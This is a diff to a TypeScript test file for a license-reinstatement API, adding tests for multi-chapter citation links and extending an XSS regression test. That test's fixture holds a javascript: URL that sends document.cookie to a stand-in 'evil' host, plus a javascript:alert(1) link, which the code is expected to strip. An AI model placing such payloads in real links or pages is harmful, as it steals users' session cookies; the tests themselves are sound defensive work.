@@ -131,6 +131,22 @@ describe("GET /assistant/reinstatement", () => {
     expect(body.state_slug).toBe("texas");
   });
 
+  it("SRC-120: returns Hawaii's citation_links so the CPE claim's chapter is reachable", async () => {
+    const resp = await getAssistant("/api/assistant/reinstatement?state=hawaii");
+    expect(resp.status).toBe(200);
+    const body = (await resp.json()) as { citation_url: string; citation_links: { url: string; label: string }[] | null };
+    const urls = (body.citation_links ?? []).map((c) => c.url);
+    expect(urls).toContain(body.citation_url);
+    expect(urls.some((u) => u.includes("16-71"))).toBe(true);
+  });
+
+  it("SRC-120: citation_links is null for a single-chapter record", async () => {
+    const body = (await (await getAssistant("/api/assistant/reinstatement?state=texas")).json()) as {
+      citation_links: unknown;
+    };
+    expect(body.citation_links).toBeNull();
+  });
+
   it("400s on an unknown state", async () => {
     expect((await getAssistant("/api/assistant/reinstatement?state=narnia")).status).toBe(400);
   });
@@ -341,6 +357,10 @@ describe("XSS-2 regression -- citation_url scheme guard is load-bearing, not jus
             data_gap_note: null,
             citation: "Test Code s 1",
             citation_url: "javascript:fetch('https://evil/'+document.cookie)",
+            citation_links: [
+              { url: "javascript:alert(1)", label: "evil" },
+              { url: "https://example.gov/rule.pdf", label: "read the rule" },
+            ],
             last_verified: "2026-01-01",
           },
         ],
@@ -350,6 +370,7 @@ describe("XSS-2 regression -- citation_url scheme guard is load-bearing, not jus
     const result = lookupAssistantReinstatement("xx-test-state");
     expect(result).not.toBeNull();
     expect(result!.citation_url).toBeNull();
+    expect(result!.citation_links).toEqual([{ url: "https://example.gov/rule.pdf", label: "read the rule" }]);
     vi.doUnmock("../src/reinstatement.json");
     vi.resetModules();
   });
